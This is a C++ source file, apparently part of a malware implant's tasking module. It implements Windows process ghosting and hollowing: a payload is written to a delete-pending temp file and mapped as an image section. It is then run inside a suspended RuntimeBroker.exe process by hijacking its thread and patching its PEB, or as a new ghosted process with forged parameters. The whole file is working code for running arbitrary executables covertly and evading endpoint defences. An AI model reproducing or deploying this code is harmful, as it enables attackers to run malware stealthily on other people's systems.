//
// Created by diago on 2024-05-27.
//

#include <iostream>

#include "../injection.hpp"

HANDLE
tasking::create_ghosted_section(const std::string &payload_buffer) {

    FILE_DISPOSITION_INFO file_dispos   = { 0 };
    char temp_directory_path[MAX_PATH]  = { 0 };
    char temp_file_name[MAX_PATH]       = { 0 };

    HANDLE              hfile           = nullptr;
    HANDLE              hsection        = nullptr;
    fnNtCreateSection   pcreate_section = nullptr;

    NTSTATUS            status          = ERROR_SUCCESS;
    uint32_t            bytes_written   = 0;

    //------------------------------------------------------//

    auto _ = defer([&]() {
        CLOSE_HANDLE(hfile);
    });

    pcreate_section = reinterpret_cast<fnNtCreateSection>\
        (GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtCreateSection"));

    if(pcreate_section == nullptr) {
        return nullptr;
    }


    if(!GetTempPathA(MAX_PATH, temp_directory_path)) {
        return nullptr;
    }

    if(!GetTempFileNameA(temp_directory_path, "BPM", 0, temp_file_name)) {
        return nullptr;
    }

    hfile = CreateFileA(
        temp_file_name,
        GENERIC_READ    | GENERIC_WRITE | DELETE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );

    if(hfile == INVALID_HANDLE_VALUE) {
        return nullptr;
    }


    file_dispos.DeleteFile = TRUE;
    if(!SetFileInformationByHandle(
        hfile,
        FileDispositionInfo,
        &file_dispos,
        sizeof(file_dispos)
    )) {
        return nullptr;
    }

    if(!WriteFile(
        hfile,
        payload_buffer.data(),
        payload_buffer.size(),
        reinterpret_cast<LPDWORD>(&bytes_written),
        nullptr
    )) {
        return nullptr;
    }

    status = pcreate_section(
        &hsection,
        SECTION_ALL_ACCESS,
        nullptr,
        nullptr,
        PAGE_READONLY,
        SEC_IMAGE,
        hfile
    );

    if(status != ERROR_SUCCESS) {
        return nullptr;
    }

    return hsection;
}


bool
tasking::hollow(
        _In_ HANDLE hsection,
        _In_ const uint32_t entry_point_rva,
        _In_ void* preferred_base,
        _Out_ bool &mapped_at_preferred,
        std::string& console_output
    ) {

    STARTUPINFOA        startupinfo = { 0 };
    PROCESS_INFORMATION proc_info   = { 0 };
    CONTEXT             ctx         = { 0 };

    void* mapped_at         = preferred_base;
    void* peb_img_base_ptr  = nullptr;
    char* pipe_output       = nullptr;

    char non_const[MAX_PATH]            = { 0 };
    char windows_directory[MAX_PATH]    = { 0 };

    std::string curr_directory;
    std::string image_path;
    std::string command_line;

    fnNtMapViewOfSection pmap_view_of_section = nullptr;

    NTSTATUS status = ERROR_SUCCESS;
    size_t view_size = 0;

    HANDLE hread_pipe   = nullptr;
    HANDLE hwrite_pipe  = nullptr;

    //-----------------------------------------------------//

    auto _ = defer([&]() {
        CLOSE_HANDLE(proc_info.hProcess);
        CLOSE_HANDLE(proc_info.hThread);
        CLOSE_HANDLE(hread_pipe);
        CLOSE_HANDLE(hwrite_pipe);
        FREE_HEAP_BUFFER(pipe_output);
    });

    //
    // resolve function ptr
    //

    pmap_view_of_section = reinterpret_cast<fnNtMapViewOfSection>\
        (GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtMapViewOfSection"));

    if(pmap_view_of_section == nullptr) {
        return false;
    }

    //
    // set up pipe
    //

    if(!tasking::create_anonymous_pipe(&hread_pipe, &hwrite_pipe)) {
        return false;
    }

    startupinfo.cb          = sizeof(startupinfo);
    startupinfo.hStdOutput  = hwrite_pipe;
    startupinfo.hStdError   = hwrite_pipe;
    startupinfo.dwFlags     |= STARTF_USESTDHANDLES;

    //
    // create read buffer for pipe
    //

    pipe_output = static_cast<char*>(HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        4096
    ));

    if(pipe_output == nullptr) {
        return false;
    }

    //
    // Create victim process
    //

    if(!GetWindowsDirectoryA(windows_directory, MAX_PATH)) {
        return false;
    }

    curr_directory      = std::string(windows_directory) + "\\System32";
    image_path          = curr_directory + "\\RuntimeBroker.exe";
    command_line        = image_path + " -Embedding";

    memcpy(non_const, command_line.data(), command_line.size());
    if(!CreateProcessA(
        nullptr,
        non_const,
        nullptr,
        nullptr,
        TRUE,
        CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
        nullptr,
        curr_directory.c_str(),
        &startupinfo,
        &proc_info
    )) {
        return false;
    }


    //
    // map ghosted image section
    //

    status = pmap_view_of_section(
        hsection,
        proc_info.hProcess,
        &mapped_at,
        0, 0,
        nullptr,
        &view_size,
        ViewShare,
        0,
        PAGE_READONLY
    );

    if(status != ERROR_SUCCESS) {
        if(status == LURCH_IMAGE_NOT_AT_BASE) {
            mapped_at_preferred = false;
        }
        else {
            return false;
        }
    }
    else {
        mapped_at_preferred = true;
    }


    //
    // Change PEB image pointer, hijack main thread
    //

    ctx.ContextFlags = CONTEXT_ALL;
    if(!GetThreadContext(proc_info.hThread, &ctx)) {
        return false;
    }

    ctx.Rcx          = reinterpret_cast<DWORD64>(static_cast<uint8_t*>(mapped_at) + entry_point_rva);
    peb_img_base_ptr = reinterpret_cast<void*>(ctx.Rdx + 0x10);

    if(!SetThreadContext(proc_info.hThread, &ctx)) {
        return false;
    }

    if(!WriteProcessMemory(
        proc_info.hProcess,
        peb_img_base_ptr,
        &mapped_at,
        sizeof(void*),
        nullptr
    )) {
        return false;
    }

    ResumeThread(proc_info.hThread);

    //
    // read output
    //

    CloseHandle(hwrite_pipe);
    hwrite_pipe = nullptr;

    uint32_t bytes_read = 0;
    while(ReadFile(
        hread_pipe,
        pipe_output,
        4095,
        reinterpret_cast<LPDWORD>(&bytes_read),
        nullptr
    ) && bytes_read > 0) {
        console_output += pipe_output;
        std::memset(pipe_output, '\0', 4096);
    }

    return true;
}


bool
tasking::ghost(_In_ HANDLE hsection, _In_ uint32_t entry_point_rva) {

    fnNtCreateProcessEx             pcreate_process_ex  = nullptr;
    fnNtQueryInformationProcess     pquery_process_info = nullptr;
    fnNtCreateThreadEx              pcreate_thread_ex   = nullptr;
    fnRtlCreateProcessParametersEx  pcreate_params_ex   = nullptr;

    HANDLE hprocess = nullptr;
    HANDLE hthread  = nullptr;
    HMODULE hntdll  = nullptr;

    UNICODE_STRING us_image_name    = { 0 };
    UNICODE_STRING us_cmd_line      = { 0 };
    UNICODE_STRING us_curr_dir      = { 0 };
    PROCESS_BASIC_INFORMATION pbi   = { 0 };

    wchar_t windows_directory[MAX_PATH] = { 0 };
    std::wstring image_name;
    std::wstring cmd_line;
    std::wstring curr_dir;

    void*                               premote_proc_parms  = nullptr;
    uint8_t*                            image_base          = nullptr;
    PUNDOC_RTL_USER_PROCESS_PARAMETERS  pproc_params        = nullptr;
    PUNDOC_PEB                          ppeb                = nullptr;

    uint64_t env_and_parms_end          = 0;
    uint64_t env_and_parms_begin        = 0;
    size_t   env_and_parms_total_size   = 0;
    size_t   bytes_read                 = 0;

    NTSTATUS status = ERROR_SUCCESS;

    //-------------------------------------------------------------------//

    auto _ = defer([&]() {
        CLOSE_HANDLE(hprocess);
        FREE_HEAP_BUFFER(ppeb);
    });


    hntdll = GetModuleHandleW(L"NTDLL.DLL");
    if(!hntdll) {
        return false;
    }

    pcreate_process_ex  = reinterpret_cast<fnNtCreateProcessEx>(GetProcAddress(hntdll, "NtCreateProcessEx"));
    pcreate_thread_ex   = reinterpret_cast<fnNtCreateThreadEx>(GetProcAddress(hntdll, "NtCreateThreadEx"));
    pcreate_params_ex   = reinterpret_cast<fnRtlCreateProcessParametersEx>(GetProcAddress(hntdll, "RtlCreateProcessParametersEx"));
    pquery_process_info = reinterpret_cast<fnNtQueryInformationProcess>(GetProcAddress(hntdll, "NtQueryInformationProcess"));

    if(!pcreate_process_ex || !pcreate_params_ex || !pcreate_thread_ex || !pquery_process_info) {
        return false;
    }

    //
    // init unicode strings for RtlCreateProcessParametersEx...
    //

    if(!GetWindowsDirectoryW(windows_directory, MAX_PATH)) {
        return false;
    }

    curr_dir = std::wstring(windows_directory) + L"\\System32";
    image_name = curr_dir + L"\\RuntimeBroker.exe";
    cmd_line = image_name + L" -Embedding";

    _RtlInitUnicodeString(&us_curr_dir,     curr_dir.c_str());
    _RtlInitUnicodeString(&us_image_name,   image_name.c_str());
    _RtlInitUnicodeString(&us_cmd_line,     cmd_line.c_str());

    //
    // Create victim process.
    //

    status = pcreate_process_ex(
        &hprocess,
        PROCESS_ALL_ACCESS,
        nullptr,
        GetCurrentProcess(),
        PS_INHERIT_HANDLES,
        hsection,
        nullptr,
        nullptr,
        0
    );

    if(status != ERROR_SUCCESS) {
        return false;
    }

    //
    // Create fake process parameters
    //

    status = pcreate_params_ex(
        (PRTL_USER_PROCESS_PARAMETERS*)&pproc_params,
        &us_image_name,
        nullptr,
        &us_curr_dir,
        &us_cmd_line,
        get_env_block(),
        nullptr,
        nullptr,
        nullptr,
        nullptr,
        RTL_USER_PROC_PARAMS_NORMALIZED
    );

    if(status != ERROR_SUCCESS) {
        return false;
    }

    //
    // Copy remote process PEB into buffer
    //

    status = pquery_process_info(
        hprocess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        nullptr
    );

    if(status != ERROR_SUCCESS) {
        return false;
    }


    ppeb = static_cast<PUNDOC_PEB>(HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        sizeof(UNDOC_PEB)
    ));

    if(ppeb == nullptr) {
        return false;
    }


    if(!ReadProcessMemory(
        hprocess,
        pbi.PebBaseAddress,
        ppeb,
        sizeof(UNDOC_PEB),
        &bytes_read
    ) || bytes_read != sizeof(UNDOC_PEB)) {
        return false;
    }


    //
    // TODO: Is this code useless?? (maybe)
    //

    env_and_parms_begin = reinterpret_cast<uint64_t>(pproc_params);
    env_and_parms_end = reinterpret_cast<uint64_t>(pproc_params) + pproc_params->Length;

    if (pproc_params->Environment) {

        //Scenario 1
        if ((uint64_t)pproc_params > (uint64_t)pproc_params->Environment)
            env_and_parms_begin = (uint64_t)(pproc_params->Environment);

        // Scenario 2
        if ((uint64_t)pproc_params->Environment + pproc_params->EnvironmentSize > env_and_parms_end)
            env_and_parms_end = (uint64_t)pproc_params->Environment + pproc_params->EnvironmentSize;
    }

    env_and_parms_total_size = env_and_parms_end - env_and_parms_begin;


    //
    // allocate memory for parameters + env block, write them.
    //

    premote_proc_parms = VirtualAllocEx(
        hprocess,
        pproc_params,   // This might not work.
        env_and_parms_total_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if(premote_proc_parms == nullptr) {
        return false;
    }

    if(!WriteProcessMemory(
        hprocess,
        pproc_params,
        pproc_params,
        pproc_params->Length,
        nullptr
    )) {
        return false;
    }

    if(pproc_params->Environment) {
        if(!WriteProcessMemory(
            hprocess,
            pproc_params->Environment,
            pproc_params->Environment,
            pproc_params->EnvironmentSize,
            nullptr
        )) {
            return false;
        }
    }

    //
    // Update remote process' PEB to have ptr to process_parameters
    //

    if(!WriteProcessMemory(
        hprocess,
        &pbi.PebBaseAddress->ProcessParameters,
        &pproc_params,
        sizeof(void*),
        nullptr
    )) {
        return false;
    }

    //
    // Create thread at entry point
    //

    status = pcreate_thread_ex(
        &hthread,
        THREAD_ALL_ACCESS,
        nullptr,
        hprocess,
        static_cast<char*>(ppeb->ImageBaseAddress) + entry_point_rva,
        nullptr,
        0, 0, 0, 0,
        nullptr
    );

    if(status != ERROR_SUCCESS) {
        return false;
    }

    return true;
}


std::string
tasking::runexe(const bool hollow, const std::string& file_buffer) {

    const uint32_t entry_point_rva = get_entry_point_rva(file_buffer);
    if(!entry_point_rva) {
        return "Failed to get entry point RVA.";
    }

    HANDLE hsection = create_ghosted_section(file_buffer);
    if(hsection == nullptr) {
        return "Failed to create ghosted section object.";
    }

    void* preferred_base = get_img_preferred_base(file_buffer);

    if(hollow) {

        bool mapped_at_preferred = false;
        std::string console_output;

        if(!tasking::hollow(hsection, entry_point_rva, preferred_base, mapped_at_preferred, console_output)) {
            return "failed to perform hollowing.";
        }

        if(mapped_at_preferred) {
            return "successfully performed hollowing. mapped at preferred base address.\nconsole output:\n" + console_output;
        }

        return "executable was not mapped at preferred base, issues or crashes may occur.\nconsole output:\n" + console_output;
    }

    if(!ghost(hsection, entry_point_rva)) {
        return "failed to perform ghosting.";
    }

    return "performed process ghosting. Executable ran.";
}



